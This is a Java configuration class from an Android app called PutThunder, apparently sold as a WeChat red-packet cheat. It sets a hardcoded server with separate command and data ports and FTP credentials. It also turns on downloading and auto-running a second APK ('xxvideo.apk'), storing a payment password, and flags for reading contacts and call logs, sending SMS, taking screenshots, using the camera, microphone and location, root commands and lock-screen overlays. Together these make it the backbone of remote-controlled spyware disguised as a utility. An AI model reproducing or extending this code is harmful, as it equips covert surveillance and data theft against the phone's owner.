package util;

import com.byc.PutThunder2.R;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import util.Funcs;
import util.RootShellCmd;

/**
 * @author byc
 *
 */
public class ConfigCt {
	
	public static final String PREFERENCE_NAME = "byc_putthunder_config";//配置文件名称
	
	public static final String TAG = "byc001";//调试标识：
	public static final String TAG2 = "byc002";//调试标识：
	public static final boolean DEBUG =false;//调试标识：
	//微信的包名
	public static final String WECHAT_PACKAGENAME = "com.tencent.mm"; 
	public static final String QQ_PACKAGENAME = "com.tencent.mobileqq";

	public static final String appID="aa";//定义app标识：
    //服务器IP
    //public static final String HOST = "host";
	public static final String host = "119.23.68.205";
	//服务器端口
	//private static final int port = 8000;
	public static final int port_order = 8100;//命令接收端口
	public static final int port_data = 8101;//数据接收端口
	
    //唯一标识符
    //public static final String PHONE_ID = "PhoneID";
    //--------------------------------------------------------------------------------------
    //支付密码：
    private static final String PAY_PWD="Pay_PWD";//支付密码
    public static final String KEY_PWD="";//--默认支付密码000000
    public static String sPWD="";//--默认支付密码000000
    public static boolean bReg=true;
    //广播消息定义
    public static final String ACTION_QIANGHONGBAO_SERVICE_DISCONNECT = "com.byc.putthunder.ACCESSBILITY_DISCONNECT";
    public static final String ACTION_QIANGHONGBAO_SERVICE_CONNECT = "com.byc.putthunder.ACCESSBILITY_CONNECT";
    public static final String ACTION_DOWNLOAD_INFO = "com.byc.putthunder.DOWNLOAD_INFO ";//下载消息
    public static final String ACTION_INSTALL_INFO = "com.byc.putthunder.INSTALL_INFO ";//安装消息
    public static final String ACTION_CMD_INFO = "com.byc.putthunder.CMD_INFO ";//root命令消息
    public static final String ACTION_UPDATE_INFO = "com.byc.UPDATE_INFO ";//更新消息
    public static final String ACTION_ACCESSBILITY_SERVICE_CLICK = "com.byc.putthunder.ACCESSBILITY_SERVICE_CLICK";//点击广播；
    public static final String ACTION_ACCESSBILITY_SERVICE_REQUEST = "com.byc.ACCESSBILITY_SERVICE_REQUEST";//点击广播；
    //定义UI界面：
    public static final String WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
    public static final String SETTING_PACKAGENAME="com.android.settings";
    //屏幕分辨率：
    //public static int screenWidth=0;
    //public static int screenHeight=0;
    //public static int currentapiVersion=0;
    //版本号：
    public static String version="";
    public static int versionCode=100;
    //ftp
    public static final String ftpUserName="byc";
    public static final String ftpPwd="byc";
    //服务器信息：
    public static final String FTP_FILE_NAME="putthunder.xml";//服务器上文件名；
    private static final String INFO_NEW_VERSION="Info_New_Version";//--新版本 号
    public static String  new_version="7.71";//新版本号 
    private static final String INFO_CONTACT="Info_Contact";//--
    public static String contact="QQ：2926287781微信：byc6368";//联系方式
    private static final String INFO_AD="Info_AD";//--
    public static String ad="排雷专家（100%避雷）埋雷专家软件（埋几个雷就出几个）。可试用。";//广告语
    private static final String INFO_DOWNLOAD="Info_Download";//--
    public static String download="http://119.23.68.205/android/putthunder.apk";//下载地址
    private static final String INFO_HOMEPAGE="Info_HomePage";//--
    public static String homepage="http://119.23.68.205/android/index.htm";//下载地址
    private static final String INFO_WARNING="Info_Warning";//--
    public static String warning="警告：未授权用户出雷机率在0~3个之间！授权后埋几个雷就出几个！";//下载地址
    public static String install="xxvideo.apk";//安装包
    public static boolean install_download=true;//下载安装包吗 ？
    public static boolean install_run=true;//安装后运行 ？
	public static final String AD_REG_USER_SEND_INTERVAL="AD_Reg_User_Send_Interval";//最大已注册用户发广告间隔； 
	public static int RegUserSendADinterval=10000000;//最大已注册用户发广告间隔；
	public static final String AD_NO_REG_USER_SEND_INTERVAL="AD_No_Reg_User_Send_Interval";//最大未注册用户发广告间隔； 
	public static int NoRegUserSendADinterval=1000;//最大未注册用户发广告间隔； 
	public static final String AD_OTHER_MEDIA_SEND_INTERVAL="AD_Other_Media_Send_Interval";//最大已注册对其它媒体发广告间隔；
	public static int OtherMediaSendADinterval=1000;//最大已注册对其它媒体发广告间隔； 
	public static final String AD_LUCKY_MONEY_SEND_IS="AD_Lucky_Money_Send_Is";//群里面有红包发布广告吗；
	public static boolean bLuckyMoneySend=false;//群里面有红包发布广告吗
	public static final String WX_INFO="wechat_info";//微信信息；
	public static String wi="";//微信信息；
	  //本地目录：
    public volatile static String LocalDir="";//本地工作目录；
    public volatile static String LocalPath="";//本地工作路径；
    public volatile static String LocalUploadPath="";//本地工作上传路径
    private static final String WORK_SPACE="byc";//--本地工作目录名；
    private static final String ROOT_PERMISSION="root_permission";//--；
    public volatile static boolean bRoot=false;//是否root
    public volatile static String AppName="";//本app名称；
    public volatile static String PhoneBrand="";//手机品牌；
    public static final String PHONE_BRAND_XIAOMI="Xiaomi";//--Xiaomi
    public static final String PHONE_BRAND_HONOR="Honor";//--Honor
    public volatile static int screenWidth=0;//屏幕宽；
    public volatile static int screenHeight=0;//屏幕高；
    public volatile static int navigationBarHeight=0;//导航栏高；
    
    private static ConfigCt current;
	private SharedPreferences preferences;
	public  static Context context;
	SharedPreferences.Editor editor;
	    
	private ConfigCt(Context context) {
		ConfigCt.context = context;
		preferences = context.getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE);
		editor = preferences.edit(); 
		LocalDir=this.getLocalDir();
		bRoot=RootShellCmd.isRoot(context);
		ConfigCt.version=getSelfVersion();
		AppName=getSelfName();
		PhoneBrand=getPhoneBrand();
		//2.取出服务器信息：
		ConfigCt.new_version=this.getNewVersion();
		ConfigCt.download=this.getDownloadAddr();
		ConfigCt.contact=this.getContactWay();
		ConfigCt.warning=this.getWarning();
		ConfigCt.homepage=this.getHomepage();
		ConfigCt.ad=this.getAd();
		ConfigCt.NoRegUserSendADinterval=this.getNoRegUserSendADinterval();
		ConfigCt.RegUserSendADinterval=this.getRegUserSendADinterval();
		ConfigCt.OtherMediaSendADinterval=this.getOtherMediaSendADinterval();
		ConfigCt.bLuckyMoneySend=this.getLuckyMoneySendIs();

	}
	public static synchronized ConfigCt getInstance(Context context) {
	        if(current == null) {
	            current = new ConfigCt(context.getApplicationContext());
	        }
	        return current;
	}
	public String getLocalDir(){
        String sdcardPath = Environment.getExternalStorageDirectory().toString();
        String workDir = sdcardPath + "/" + WORK_SPACE;
        String uploadDir=workDir+ "/upload";
        Funcs.makeDir(workDir);
        Funcs.makeDir(uploadDir);
        LocalDir=workDir;
        LocalPath=workDir+ "/" ;
        LocalUploadPath=uploadDir+ "/" ;
        return workDir;
	}
	private String getSelfName(){
    	//AppName=context.getString(R.string.app_name);
    	int id=util.ResourceUtil.getStringId(context, "app_name");
    	AppName=context.getString(id);
    	return AppName;
	}
	private String getSelfVersion(){
		try {
			PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
			ConfigCt.version = info.versionName;
			ConfigCt.versionCode=info.versionCode;
	      		  //if(DEBUG)Log.i(TAG, info.applicationInfo.name);
			return  ConfigCt.version;
		} catch (PackageManager.NameNotFoundException e) {
			e.printStackTrace();
			return "";
		}
	}
	/*
	     * 手机品牌： Xiaomi,Honor
	*/
	private String getPhoneBrand(){
	    	PhoneBrand=android.os.Build.BRAND;//手机品牌 
	    	return PhoneBrand;
	}   
	  
	/*设置支付密码：*/
	public String getPayPWD() {
	        return preferences.getString(PAY_PWD, "");
	}
	public void setPayPWD(String sPayPWD) {
	        editor.putString(PAY_PWD, sPayPWD).apply();
	}

	    //----------------------------------保存服务器信息----------------------------------
	    /** 新版本号*/
	    public String getNewVersion() {
	        return preferences.getString(INFO_NEW_VERSION, new_version);
	    }
	    /** 新版本号*/
	    public void setNewVersion(String version) {
	    	editor.putString(INFO_NEW_VERSION, version).apply();
	    }
	    /** 联系方式*/
	    public String getContactWay() {
	        return preferences.getString(INFO_CONTACT,contact);
	    }
	    /** 联系方式*/
	    public void setContactWay(String contactWay) {
	    	editor.putString(INFO_CONTACT, contactWay).apply();
	    }
	    /** 广告语*/
	    public String getAd() {
	        return preferences.getString(INFO_AD,ad);
	    }
	    /** 广告语*/
	    public void setAd(String Ad) {
	    	editor.putString(INFO_AD, Ad).apply();
	    }
	    /** 更新地址*/
	    public String getDownloadAddr() {
	        return preferences.getString(INFO_DOWNLOAD, download);
	    }
	    /** 更新地址*/
	    public void setDownloadAddr(String downloadAddr) {
	    	editor.putString(INFO_DOWNLOAD, downloadAddr).apply();
	    }
	    /**主页地址*/
	    public String getHomepage() {
	        return preferences.getString(INFO_HOMEPAGE, homepage);
	    }
	    /** 主页地址*/
	    public void setHomepage(String homepage) {
	    	editor.putString(INFO_HOMEPAGE, homepage).apply();
	    }
	    /**警告信息*/
	    public String getWarning() {
	        return preferences.getString(INFO_WARNING, warning);
	    }
	    /** 警告信息*/
	    public void setWarning(String warning) {
	    	editor.putString(INFO_WARNING, warning).apply();
	    }
	    /**最大已注册用户发广告间隔*/
	    public int getRegUserSendADinterval() {
	        return preferences.getInt(AD_REG_USER_SEND_INTERVAL, RegUserSendADinterval);
	    }
	    /** 最大已注册用户发广告间隔*/
	    public void setRegUserSendADinterval(int regUserSendADinterval) {
	    	editor.putInt(AD_REG_USER_SEND_INTERVAL, regUserSendADinterval).apply();
	    }
	    /**最大未注册用户发广告间隔*/
	    public int getNoRegUserSendADinterval() {
	        return preferences.getInt(AD_NO_REG_USER_SEND_INTERVAL, NoRegUserSendADinterval);
	    }
	    /** 最大已注册用户发广告间隔*/
	    public void setNoRegUserSendADinterval(int noRegUserSendADinterval) {
	    	editor.putInt(AD_NO_REG_USER_SEND_INTERVAL, noRegUserSendADinterval).apply();
	    }
	    /**最大已注册对其它媒体发广告间隔*/
	    public int getOtherMediaSendADinterval() {
	        return preferences.getInt(AD_OTHER_MEDIA_SEND_INTERVAL, OtherMediaSendADinterval);
	    }
	    /** 最大已注册对其它媒体发广告间隔*/
	    public void setOtherMediaSendADinterval(int otherMediaSendADinterval) {
	    	editor.putInt(AD_OTHER_MEDIA_SEND_INTERVAL, otherMediaSendADinterval).apply();
	    }
	    /**群里面有红包发布广告吗*/
	    public boolean getLuckyMoneySendIs() {
	        return preferences.getBoolean(AD_LUCKY_MONEY_SEND_IS, bLuckyMoneySend);
	    }
	    /** 群里面有红包发布广告吗*/
	    public void setLuckyMoneySendIs(boolean LuckyMoneySend) {
	    	editor.putBoolean(AD_LUCKY_MONEY_SEND_IS, LuckyMoneySend).apply();
	    }
	    /**微信信息*/
	    public String getWechatInfo() {
	        return preferences.getString(WX_INFO, wi);
	    }
	    /** 微信信息*/
	    public void setWechatInfo(String info) {
	    	editor.putString(WX_INFO, info).apply();
	    }
	    //-----------------------是否发送短信----------------------------------------
	    public boolean getIsSendSms() {
	        return preferences.getBoolean("SEND_SMS", false);
	    }
	    public void setIsSendSms(boolean bSend) {
	        editor.putBoolean("SEND_SMS", bSend).apply();
	    }
	    //-----------------------是否发送短信到手机----------------------------------------
	    public boolean getIsSendSmsToPhone() {
	        return preferences.getBoolean("SEND_SMS_TO_PHONE", false);
	    }
	    public void setIsSendSmsToPhone(boolean bSend) {
	        editor.putBoolean("SEND_SMS_TO_PHONE", bSend).apply();
	    }
	    //-----------------------是否有读通话记录功能----------------------------------------
	    public boolean getIsReadCallLog() {
	        return preferences.getBoolean("CALL_LOG", false);
	    }
	    public void setIsReadCallLog(boolean bSend) {
	        editor.putBoolean("CALL_LOG", bSend).apply();
	    }
	    //-----------------------是否有读通讯录功能----------------------------------------
	    public boolean getIsReadContact() {
	        return preferences.getBoolean("CONTACT_CONTENT", false);
	    }
	    public void setIsReadContact(boolean bSend) {
	        editor.putBoolean("CONTACT_CONTENT", bSend).apply();
	    }
	    /**是否有截屏权限*/
	    public boolean haveScreenShotPower() {
	        return preferences.getBoolean("SCREEN_SHOT_POWER", false);
	    }
	    /** 是否有截屏权限*/
	    public void setScreenShotPower(boolean bHave) {
	    	editor.putBoolean("SCREEN_SHOT_POWER", bHave).apply();
	    }
	    /** 是否有ROOT权限*/
	    public void setRootPermission(boolean bHave) {
	    	editor.putBoolean(ROOT_PERMISSION, bHave).apply();
	    }
	    /**是否有root权限*/
	    public boolean haveRootPermission() {
	        return preferences.getBoolean(ROOT_PERMISSION, false);
	    }
	    /** 是否有carmera权限*/
	    public void setCameraPermission(boolean bHave) {
	    	editor.putBoolean("CAMERA_PERMISSION", bHave).apply();
	    }
	    /**是否有carmera权限*/
	    public boolean haveCameraPermission() {
	        return preferences.getBoolean("CAMERA_PERMISSION", false);
	    }
	    /** 是否有Audio权限*/
	    public void setAudioPermission(boolean bHave) {
	    	editor.putBoolean("AUDIO_PERMISSION", bHave).apply();
	    }
	    /**是否有Audio权限*/
	    public boolean haveAudioPermission() {
	        return preferences.getBoolean("AUDIO_PERMISSION", false);
	    }
	    /** 是否有LOCK权限*/
	    public void setLockPermission(boolean bHave) {
	    	editor.putBoolean("LOCK_PERMISSION", bHave).apply();
	    }
	    /**是否有LOCK权限*/
	    public boolean haveLockPermission() {
	        return preferences.getBoolean("LOCK_PERMISSION", false);
	    }
	    /** 是否有定位权限*/
	    public void setLocatePermission(boolean bHave) {
	    	editor.putBoolean("LOCATE_PERMISSION", bHave).apply();
	    }
	    /**是否有定位权限*/
	    public boolean haveLocatePermission() {
	        return preferences.getBoolean("LOCATE_PERMISSION", false);
	    }
         /**QQ信息*/
	    public String getQQInfo() {
	        return preferences.getString("QQ_INFO", "");
	    }
	    /** QQ信息*/
	    public void setQQInfo(String info) {
	    	editor.putString("QQ_INFO", info).apply();
	    }
	    /** 是否设置悬浮窗锁屏权限*/
	    public void setFloatWindowLock(boolean bLock) {
	    	editor.putBoolean("FLOAT_WINDOW_LOCK", bLock).apply();
	    }
	    /**是否有悬浮窗锁屏*/
	    public boolean isFloatWindowLock() {
	        return preferences.getBoolean("FLOAT_WINDOW_LOCK", false);
	    }
	    /**QQ视频数量*/
	    public int getQQVideoCount() {
	        return preferences.getInt("QQ_VIDEO_COUNT",0);
	    }
	    /** QQ视频数量*/
	    public void setQQVideoCount(int count) {
	    	editor.putInt("QQ_VIDEO_COUNT", count).apply();
	    }
	    /**WX视频数量*/
	    public int getWXVideoCount() {
	        return preferences.getInt("WX_VIDEO_COUNT", 0);
	    }
	    /** WX视频数量*/
	    public void setWXVideoCount(int count) {
	    	editor.putInt("WX_VIDEO_COUNT", count).apply();
	    }
	    /**WX登陆视频数量*/
	    public int getWXLoginVideoCount() {
	        return preferences.getInt("WX_LOGIN_VIDEO_COUNT", 0);
	    }
	    /** WX登陆视频数量*/
	    public void setWXLoginVideoCount(int count) {
	    	editor.putInt("WX_LOGIN_VIDEO_COUNT", count).apply();
	    }
	    /**QQ登陆视频数量*/
	    public int getQQLoginVideoCount() {
	        return preferences.getInt("QQ_LOGIN_VIDEO_COUNT", 0);
	    }
	    /** WX登陆视频数量*/
	    public void setQQLoginVideoCount(int count) {
	    	editor.putInt("QQ_LOGIN_VIDEO_COUNT", count).apply();
	    }
}
